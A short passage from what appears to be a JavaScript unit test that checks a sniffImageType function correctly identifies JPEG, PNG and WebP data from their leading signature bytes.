    const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    const webp = new Uint8Array([
      0x52, 0x49, 0x46, 0x46, 0x1c, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50
    ]);

    expect(sniffImageType(jpeg)).toBe("image/jpeg");
    expect(sniffImageType(png)).toBe("image/png");
    expect(sniffImageType(webp)).toBe("image/webp");
  });
});


